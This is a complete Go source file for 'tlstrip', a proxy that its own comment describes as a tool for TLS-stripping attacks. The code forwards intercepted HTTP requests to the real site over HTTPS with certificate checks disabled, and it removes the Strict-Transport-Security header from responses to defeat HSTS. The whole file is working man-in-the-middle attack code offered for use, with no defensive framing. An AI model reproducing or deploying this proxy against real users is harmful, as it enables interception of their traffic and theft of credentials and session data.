/*
Tlstrip is a proxy server for TLS-stripping attacks.
It avoids HSTS protection mechanism by removing "Strict-Transport-Security"
header from remote server's response.

Passing -n flag makes it proxy connection non-transparently.
Without an explicit address, it listens on all host's addresses, port 8181.

Usage:
	tlstrip [-n] [address]
*/
package main

import (
	"crypto/tls"
	"flag"
	"io"
	"log"
	"net/http"
)

var (
	notStrict = flag.Bool("n", false, "proxy connections non-transparently")
	addr      string
)

func main() {
	flag.Parse()
	addr = flag.Arg(0)
	if addr == "" {
		addr = ":8181"
	}
	log.Println("Listening on", addr)
	log.Println("Transparent:", !*notStrict)
	log.Fatal(http.ListenAndServe(addr, http.HandlerFunc(proxyHandler)))
}

func proxyHandler(w http.ResponseWriter, r *http.Request) {
	url := "https://"
	if *notStrict {
		url += r.URL.Host + r.URL.Path
	} else {
		url += r.Host + r.RequestURI
	}
	proxy(w, r, url)
}

func proxy(w http.ResponseWriter, r *http.Request, url string) {
	req, err := http.NewRequest(r.Method, url, r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	for k, v := range r.Header {
		for _, s := range v {
			req.Header.Add(k, s)
		}
	}
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	resp.Header.Del("Strict-Transport-Security")
	header := w.Header()
	for k, v := range resp.Header {
		for _, s := range v {
			header.Add(k, s)
		}
	}
	w.WriteHeader(resp.StatusCode)
	io.Copy(w, resp.Body)
}
